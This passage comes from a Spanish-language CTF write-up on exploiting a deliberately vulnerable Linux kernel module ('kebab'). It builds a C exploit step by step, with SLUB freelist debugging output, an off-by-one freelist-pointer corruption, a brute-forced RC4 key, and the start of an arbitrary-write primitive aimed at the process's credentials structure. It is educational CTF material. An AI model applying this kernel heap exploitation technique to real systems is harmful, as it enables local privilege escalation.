+<span class="mtk1">  </span><span class="mtk8">memcpy</span><span class="mtk1">((</span><span class="mtk7 mtki">void</span><span class="mtk5">*</span><span class="mtk1">) ki, key, MAX_RC4_LEN);</span>
+<span class="mtk1">  </span><span class="mtk5">return</span> <span class="mtk8">ioctl</span><span class="mtk1">(fd, KEBAB_IOCTL_SET_KEY, (</span><span class="mtk7 mtki">void</span><span class="mtk5">*</span><span class="mtk1">) ki);</span>
+<span class="mtk1">}</span>
+</code></pre></div><h3 id="primeras-pruebas">Primeras pruebas</h3><p>Ahora, en el <code>main</code> podemos añadir lo siguiente:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> ret;</span>
+
+<span class="mtk1">  </span><span class="mtk8">open_device</span><span class="mtk1">();</span>
+
+<span class="mtk1">  </span><span class="mtk8">memset</span><span class="mtk1">(RC4_key, </span><span class="mtk5">0x</span><span class="mtk6">41</span><span class="mtk1">, MAX_RC4_LEN);</span>
+<span class="mtk1">  RC4_key[</span><span class="mtk6">255</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk7 mtki">struct</span><span class="mtk1"> key_info ki;</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> ((ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">ioctl_set_key</span><span class="mtk1">(RC4_key, </span><span class="mtk5">&amp;</span><span class="mtk1">ki))) {</span>
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"[!] Error ioctl_set_key"</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">close</span><span class="mtk1">(fd);</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> ret;</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"pid: </span><span class="mtk6">%d\n</span><span class="mtk4">cur: </span><span class="mtk6">%p\n</span><span class="mtk4">max_len: </span><span class="mtk6">%ld\n</span><span class="mtk4">"</span><span class="mtk1">, ki.pid, ki.cur, ki.max_len);</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk8">getchar</span><span class="mtk1">();</span>
+
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> buff[</span><span class="mtk5">0x</span><span class="mtk6">20</span><span class="mtk1">];</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> secbuff[</span><span class="mtk5">0x</span><span class="mtk6">20</span><span class="mtk1">];</span>
+
+<span class="mtk1">  </span><span class="mtk5">for</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1"> i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; i </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">20</span><span class="mtk1">; i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
+<span class="mtk1">    buff[i] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">30</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> (i </span><span class="mtk5">/</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  buff[</span><span class="mtk5">0x</span><span class="mtk6">20</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk8">RC4</span><span class="mtk1">(buff, secbuff, </span><span class="mtk5">sizeof</span><span class="mtk1">(buff));</span>
+
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"buff: </span><span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">, buff);</span>
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"secbuff: "</span><span class="mtk1">);</span>
+
+<span class="mtk1">  </span><span class="mtk5">for</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1"> i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; i </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk5">sizeof</span><span class="mtk1">(buff); i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%02x</span><span class="mtk4">"</span><span class="mtk1">, (</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk1">) secbuff[i]);</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">""</span><span class="mtk1">);</span>
+
+<span class="mtk1">  </span><span class="mtk7 mtki">struct</span><span class="mtk1"> new_secbuff_arg new_arg </span><span class="mtk5">=</span><span class="mtk1"> {</span>
+<span class="mtk1">    .size </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">sizeof</span><span class="mtk1">(buff) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">,</span>
+<span class="mtk1">    .buffer </span><span class="mtk5">=</span><span class="mtk1"> buff,</span>
+<span class="mtk1">  };</span>
+
+<span class="mtk1">  </span><span class="mtk8">strncpy</span><span class="mtk1">(new_arg.key, RC4_key, MAX_RC4_LEN);</span>
+
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"size: </span><span class="mtk6">%ld\n</span><span class="mtk4">key: </span><span class="mtk6">%s\n</span><span class="mtk4">buffer: </span><span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">, new_arg.size, new_arg.key, new_arg.buffer);</span>  
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> ((ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">ioctl_new</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">new_arg))) {</span>
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"[!] Error ioctl_new"</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">close</span><span class="mtk1">(fd);</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> ret;</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"size: </span><span class="mtk6">%ld\n</span><span class="mtk4">key: </span><span class="mtk6">%s\n</span><span class="mtk4">buffer: </span><span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">, new_arg.size, new_arg.key, new_arg.buffer);</span>
+<span class="mtk1">  </span><span class="mtk8">getchar</span><span class="mtk1">();</span>
+
+<span class="mtk1">  </span><span class="mtk8">close</span><span class="mtk1">(fd);</span>
+
+<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Con la primera parte del <code>main</code>, abrimos el <em>device</em> y configuramos la clave de RC4 con 255 caracteres <code>A</code>. Antes de ejecutar el <em>exploit</em>, vamos a sacar las direcciones de los símbolos que introduce el módulo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/home/user # grep kebab /proc/kallsyms
+ffffffffc0375024 r _note_6      [kebab]
+ffffffffc0374000 t kebab_open   [kebab]
+ffffffffc0374010 t ioctl_read   [kebab]
+ffffffffc0376a00 b RC4_key      [kebab]
+ffffffffc0376b40 b n_buffs      [kebab]
+ffffffffc0376b60 b sec_buffs    [kebab]
+ffffffffc0374240 t kebab_release        [kebab]  
+ffffffffc0374bba t rc4_init.cold        [kebab]
+ffffffffc0374be0 t RC4.cold     [kebab]
+ffffffffc03751a8 r __func__.0   [kebab]
+ffffffffc03751a0 r __func__.1   [kebab]
+ffffffffc0374490 t ioctl_new    [kebab]
+ffffffffc0374a90 t kebab_ioctl  [kebab]
+ffffffffc0376b20 b kebab_mutex  [kebab]
+ffffffffc0374bf8 t kebab_ioctl.cold     [kebab]
+ffffffffc0376a00 b __key.2      [kebab]
+ffffffffc0376600 d kebab_device [kebab]
+ffffffffc0374c0c t kebab_exit   [kebab]
+ffffffffc03751c0 r kebab_fops   [kebab]
+ffffffffc0376680 d __this_module        [kebab]
+ffffffffc0374250 t rc4_init     [kebab]
+ffffffffc0374c0c t cleanup_module       [kebab]
+ffffffffc03743f0 t RC4  [kebab]
+ffffffffc0374370 t rc4_crypt    [kebab]
+</code></pre></div><p>Y ahora ejecutamos el <em>exploit</em>, que se queda parado en <code>getchar</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/home/user # ./exploit
+[*] Opened device
+pid: 125
+cur: 0xffff8e1ffdf8c140  
+max_len: 256
+</code></pre></div><p>En este punto, nos podemos conectar a <code>qemu</code> con GDB e inspeccionar algunas direcciones:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">initramfs/chall/kebab_mod.ko</span>
+Reading symbols from <span class="code-dark-green">initramfs/chall/kebab_mod.ko</span>...  
+<span class="code-red">gef&gt; </span>target remote 127.0.0.1:1234
+Remote debugging using 127.0.0.1:1234
+<span class="code-dark-blue">0xffffffffbabd62fe</span> in <span class="code-dark-yellow">??</span> ()
+</code></pre></div><p>Por ejemplo, la dirección de <code>RC4_key</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/s 0xffffffffc0376a00
+<span class="code-dark-blue">0xffffffffc0376a00</span>:     'A' &lt;repeats 255 times&gt;
+<span class="code-green">gef&gt; </span>x/32gx 0xffffffffc0376a00
+<span class="code-dark-blue">0xffffffffc0376a00</span>:     0x4141414141414141      0x4141414141414141  
+<span class="code-dark-blue">0xffffffffc0376a10</span>:     0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0xffffffffc0376a20</span>:     0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0xffffffffc0376a30</span>:     0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0xffffffffc0376a40</span>:     0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0xffffffffc0376a50</span>:     0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0xffffffffc0376a60</span>:     0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0xffffffffc0376a70</span>:     0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0xffffffffc0376a80</span>:     0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0xffffffffc0376a90</span>:     0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0xffffffffc0376aa0</span>:     0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0xffffffffc0376ab0</span>:     0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0xffffffffc0376ac0</span>:     0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0xffffffffc0376ad0</span>:     0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0xffffffffc0376ae0</span>:     0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0xffffffffc0376af0</span>:     0x4141414141414141      0x0041414141414141
+</code></pre></div><p>Si continuamos el <em>exploit</em>, se creará una nota cifrada:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>buff: 0000000000000000111111111111111
+secbuff: f2fbd60df093fd918a9b596cd4c0051b4674a383259834485b5a98cc01d1cec5
+size: 31
+key: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
+buffer: 0000000000000000111111111111111
+size: 31
+key: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+buffer: 0000000000000000111111111111111
+</code></pre></div><p>Este es el <em>array</em> de notas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/4gx 0xffffffffc0376b60
+<span class="code-dark-blue">0xffffffffc0376b60</span>:     0xffff8e1ffdf71910      0x0000000000000000  
+<span class="code-dark-blue">0xffffffffc0376b70</span>:     0x0000000000000000      0x0000000000000000
+</code></pre></div><p>Y la dirección <code>0xffff8e1ffdf71910</code> apunta a una estructura <code>secure_buffer</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/2gx 0xffff8e1ffdf71910
+<span class="code-dark-blue">0xffff8e1ffdf71910</span>:     0xffff8e1ffd62b180      0x000000000000001f  
+</code></pre></div><p>Aquí vemos el tamaño de la nota (<code>0x1f</code>) y el puntero al <em>buffer</em> cifrado:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/4gx 0xffff8e1ffd62b180
+<span class="code-dark-blue">0xffff8e1ffd62b180</span>:     0x91fd93f00dd6fbf2      0x1b05c0d46c599b8a  
+<span class="code-dark-blue">0xffff8e1ffd62b190</span>:     0x4834982583a37446      0xc5ced101cc985a5b
+</code></pre></div><p>En efecto, los datos anteriores están cifrados con RC4 de la manera esperada. Podemos comprobarlo en Python:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
+&gt;&gt;&gt; key = b'A' * 255
+&gt;&gt;&gt; pt = b'0' * 16 + b'1' * 15
+&gt;&gt;&gt; ct = ARC4(key).encrypt(pt + b'\0')
+&gt;&gt;&gt;
+&gt;&gt;&gt; ct.hex()
+'f2fbd60df093fd918a9b596cd4c0051b4674a383259834485b5a98cc01d1cec5'
+&gt;&gt;&gt;
+&gt;&gt;&gt; print('\n'.join(f"0x{int.from_bytes(ct[i:i+8], 'little'):016x} 0x{int.from_bytes(ct[i+8:i+16], 'little'):016x}" for i in range(0, len(ct), 16)))  
+0x91fd93f00dd6fbf2 0x1b05c0d46c599b8a
+0x4834982583a37446 0xc5ced101cc985a5b
+</code></pre></div><p>Además, vemos que aunque indicamos 31 (<code>0x1f</code>) como el tamaño del <em>buffer</em>, realmente se cifraron 32 caracteres (debido al <em>off-by-one</em>), siendo el último carácter un byte nulo.</p><p>En este punto, podemos mirar qué hay justo después del <em>buffer</em> que nos ha dado el gestor de memoria:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/12gx 0xffff8e1ffd62b180
+<span class="code-dark-blue">0xffff8e1ffd62b180</span>:     0x91fd93f00dd6fbf2      0x1b05c0d46c599b8a  
+<span class="code-dark-blue">0xffff8e1ffd62b190</span>:     0x4834982583a37446      0xc5ced101cc985a5b
+<span class="code-dark-blue">0xffff8e1ffd62b1a0</span>:     0xffff8e1ffd62b1c0      0xffff8e1ffd62b1c0
+<span class="code-dark-blue">0xffff8e1ffd62b1b0</span>:     0xffffffffbba9b461      0x0000000000000000
+<span class="code-dark-blue">0xffff8e1ffd62b1c0</span>:     0xffff8e1ffd62b1e0      0xffff8e1ffd62b1e0
+<span class="code-dark-blue">0xffff8e1ffd62b1d0</span>:     0xffffffffbba9b3e6      0x0000000000000000
+</code></pre></div><p>Como estamos en <code>kmalloc-32</code>, lo que vemos arriba es nuestro <em>chunk</em> donde está el <em>buffer</em> cifrado y después más <em>chunks</em>, contiguos. En este caso, estos <em>chunks</em> están libres, lo sabemos porque el primer campo tiene un puntero que apunta al siguiente <em>chunk</em> libre (más información en <a href="https://blogs.oracle.com/linux/post/linux-slub-allocator-internals-and-debugging-1#slab-cache-layout-for-the-slub-allocator">blogs.oracle.com</a>):</p><p><img src="/images/other/HackOn%20CTF/Kerbab-1.webp" alt="Kerbab 1"></p><p>También podemos ver esta información usando funciones de <a href="https://github.com/bata24/gef"><code>gef</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>slub-dump kmalloc-32 -n
+<span class="code-blue">[+]</span> Wait for memory scan
+<span class="code-dark-cyan">--------------------------------------------------------------------------- CPU 0 ---------------------------------------------------------------------------</span>  
+slab_caches @ 0xffffffffbb775160
+
+  kmem_cache: 0xffff8e1ffe401900
+    name: <span class="code-cyan mtku">kmalloc-32</span>
+    flags: 0x40000000 (__CMPXCHG_DOUBLE)
+    object size: <span class="code-magenta">0x20</span> (chunk size: 0x20)
+    offset (next pointer in chunk): 0x0
+    kmem_cache_cpu (cpu0): 0xffff8e1ffe82c080
+      <span class="code-green mtku">active page</span>: 0xffffee8c80f58ac0
+        virtual address: <span class="code-white">0xffff8e1ffd62b000</span>
+        num pages: 1
+        in-use: 13/128
+        frozen: 1
+        layout:   0x000 <span class="code-grey">0xffff8e1ffd62b000</span> (in-use)
+                  0x001 <span class="code-grey">0xffff8e1ffd62b020</span> (in-use)
+                  0x002 <span class="code-grey">0xffff8e1ffd62b040</span> (in-use)
+                  0x003 <span class="code-grey">0xffff8e1ffd62b060</span> (in-use)
+                  0x004 <span class="code-grey">0xffff8e1ffd62b080</span> (in-use)
+                  0x005 <span class="code-grey">0xffff8e1ffd62b0a0</span> (in-use)
+                  0x006 <span class="code-grey">0xffff8e1ffd62b0c0</span> (in-use)
+                  0x007 <span class="code-grey">0xffff8e1ffd62b0e0</span> (in-use)
+                  0x008 <span class="code-grey">0xffff8e1ffd62b100</span> (in-use)
+                  0x009 <span class="code-grey">0xffff8e1ffd62b120</span> (in-use)
+                  0x00a <span class="code-grey">0xffff8e1ffd62b140</span> (in-use)
+                  0x00b <span class="code-grey">0xffff8e1ffd62b160</span> (in-use)
+                  0x00c <span class="code-grey">0xffff8e1ffd62b180</span> (in-use)
+                  0x00d <span class="code-yellow">0xffff8e1ffd62b1a0</span> (next: 0xffff8e1ffd62b1c0)
+                  0x00e <span class="code-yellow">0xffff8e1ffd62b1c0</span> (next: 0xffff8e1ffd62b1e0)
+                  0x00f <span class="code-yellow">0xffff8e1ffd62b1e0</span> (next: 0xffff8e1ffd62b200)
+                  ...
+                  0x07e <span class="code-yellow">0xffff8e1ffd62bfc0</span> (next: 0xffff8e1ffd62bfe0)
+                  0x07f <span class="code-yellow">0xffff8e1ffd62bfe0</span> (next: 0x0)
+        freelist (fast path):
+                  0x00d <span class="code-yellow">0xffff8e1ffd62b1a0</span>
+                  0x00e <span class="code-yellow">0xffff8e1ffd62b1c0</span>
+                  0x00f <span class="code-yellow">0xffff8e1ffd62b1e0</span>
+                  0x010 <span class="code-yellow">0xffff8e1ffd62b200</span>
+                  ...
+                  0x07e <span class="code-yellow">0xffff8e1ffd62bfc0</span>
+                  0x07f <span class="code-yellow">0xffff8e1ffd62bfe0</span>
+        freelist (slow path): (none)
+    next: 0xffff8e1ffe401a80
+</code></pre></div><p>Entonces, con el <em>off-by-one</em> podríamos modificar el último byte del puntero que apunta al siguiente <em>chunk</em> libre. De esta forma, corrompemos la lista enlazada y podemos hacer que el <em>chunk</em> apunte a sí mismo:</p><p><img src="/images/other/HackOn%20CTF/Kerbab-2.webp" alt="Kerbab 2"></p><p>Con esto, tenemos una especie de <em>double free</em>, y podemos poner una dirección arbitraria en la <em>free-list</em>. Este sería el proceso:</p><ul><li>Asignamos un primer <em>chunk</em> y usamos el <em>off-by-one</em> para corromper la lista enlazada y que el siguiente <em>chunk</em> libre apunte a sí mismo</li><li>Asignamos un segundo <em>chunk</em> (se pondrá en <code>0x[...]1a0</code>) y escribimos una dirección arbitraria en el campo que indica la dirección del siguiente <em>chunk</em> libre</li><li>Asignamos un tercer <em>chunk</em> (se pondrá también en <code>0x[...]1a0</code>)</li><li>El siguiente <em>chunk</em> que asignemos se pondrá en la dirección arbitraria que pusimos antes</li></ul><h3 id="clave-de-rc4">Clave de RC4</h3><p>Como RC4 es un cifrado en flujo, si queremos escribir unos datos en especial, los podemos cifrar antes de pasárselos al módulo, ya que el módulo los cifrará de nuevo. Y así, como los cifrados en flujo utilizan XOR, la operación de cifrado es igual que la operación de descifrado.</p><p><img src="/images/other/HackOn%20CTF/Kerbab-3.webp" alt="Kerbab 3"></p><p><em>Fuente</em>: <a href="https://kevinliu.me/posts/rc4/">https://kevinliu.me/posts/rc4/</a></p><p>Para conseguir que en el último byte se escriba <code>0xa0</code>, necesitamos encontrar una clave concreta. Podemos usar fuerza bruta en Python hasta encontrar una clave que cumpla esto.</p><p>Realmente, durante las pruebas, descubrí que era más probable que el <em>chunk</em> adyacente estuviera en la dirección que termina en <code>0x80</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>&gt;&gt;&gt; import os
+&gt;&gt;&gt;
+&gt;&gt;&gt; key = os.urandom(3) + b'A' * 252
+&gt;&gt;&gt; pt = b'A' * 32
+&gt;&gt;&gt;
+&gt;&gt;&gt; while ARC4(key).encrypt(pt + b'\0')[-1] != 0x80 or not all(b < 0x80 for b in key):
+...     key = os.urandom(3) + b'A' * 252
+...
+&gt;&gt;&gt; key
+b'8pbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'  
+&gt;&gt;&gt;
+&gt;&gt;&gt; ct = ARC4(key).encrypt(pt + b'\0')
+&gt;&gt;&gt; ct.hex()
+'b4c040f01d36470b3a626d47e7a4289089c1344de43d7e0c0c3562937a86e88280'
+&gt;&gt;&gt;
+&gt;&gt;&gt; print('\n'.join(f"0x{int.from_bytes(ct[i:i+8], 'little'):016x} 0x{int.from_bytes(ct[i+8:i+16], 'little'):016x}" for i in range(0, len(ct), 16)))
+0x0b47361df040c0b4 0x9028a4e7476d623a
+0x0c7e3de44d34c189 0x82e8867a9362350c
+0x0000000000000080 0x0000000000000000
+</code></pre></div><p>Ahí tenemos una clave que cumple esto.</p><h3 id="primitiva-de-escritura-arbitraria">Primitiva de escritura arbitraria</h3><p>Vamos a realizar el procedimiento anterior para escribir 32 caracteres <code>B</code> en la dirección de <code>current</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> ret;</span>
+
+<span class="mtk1">  </span><span class="mtk8">open_device</span><span class="mtk1">();</span>
+
+<span class="mtk1">  </span><span class="mtk8">memset</span><span class="mtk1">(RC4_key, </span><span class="mtk4">'A'</span><span class="mtk1">, MAX_RC4_LEN);</span>
+<span class="mtk1">  RC4_key[</span><span class="mtk6">0</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'8'</span><span class="mtk1">;</span>
+<span class="mtk1">  RC4_key[</span><span class="mtk6">1</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'p'</span><span class="mtk1">;</span>
+<span class="mtk1">  RC4_key[</span><span class="mtk6">2</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'b'</span><span class="mtk1">;</span>
+<span class="mtk1">  RC4_key[</span><span class="mtk6">255</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk7 mtki">struct</span><span class="mtk1"> key_info ki;</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> ((ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">ioctl_set_key</span><span class="mtk1">(RC4_key, </span><span class="mtk5">&amp;</span><span class="mtk1">ki))) {</span>
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"[!] Error ioctl_set_key"</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">close</span><span class="mtk1">(fd);</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> ret;</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"pid: </span><span class="mtk6">%d\n</span><span class="mtk4">cur: </span><span class="mtk6">%p\n</span><span class="mtk4">max_len: </span><span class="mtk6">%ld\n</span><span class="mtk4">"</span><span class="mtk1">, ki.pid, ki.cur, ki.max_len);</span>
+
+<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"First allocation =&gt; "</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk8">getchar</span><span class="mtk1">();</span>
+
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> buff[</span><span class="mtk5">0x</span><span class="mtk6">20</span><span class="mtk1">];</span>
+
+<span class="mtk1">  </span><span class="mtk8">memset</span><span class="mtk1">(buff, </span><span class="mtk4">'A'</span><span class="mtk1">, </span><span class="mtk5">sizeof</span><span class="mtk1">(buff));</span>
+<span class="mtk1">  buff[</span><span class="mtk5">0x</span><span class="mtk6">20</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk7 mtki">struct</span><span class="mtk1"> new_secbuff_arg new_arg </span><span class="mtk5">=</span><span class="mtk1"> { .size </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">20</span><span class="mtk1">, .buffer </span><span class="mtk5">=</span><span class="mtk1"> buff };</span>
+<span class="mtk1">  </span><span class="mtk8">strncpy</span><span class="mtk1">(new_arg.key, RC4_key, MAX_RC4_LEN);</span>
+
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"size: </span><span class="mtk6">%ld\n</span><span class="mtk4">key: </span><span class="mtk6">%s\n</span><span class="mtk4">buffer: </span><span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">, new_arg.size, new_arg.key, new_arg.buffer);</span>  
+
+<span class="mtk1">  </span><span class="mtk3">// First allocation: trigger off-by-one</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> ((ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">ioctl_new</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">new_arg))) {</span>
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"[!] Error ioctl_new"</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">close</span><span class="mtk1">(fd);</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> ret;</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Second allocation =&gt; "</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk8">getchar</span><span class="mtk1">();</span>
+
+<span class="mtk1">  ((</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk5">*</span><span class="mtk1">) buff)[</span><span class="mtk6">0</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> ki.cur;</span>
+
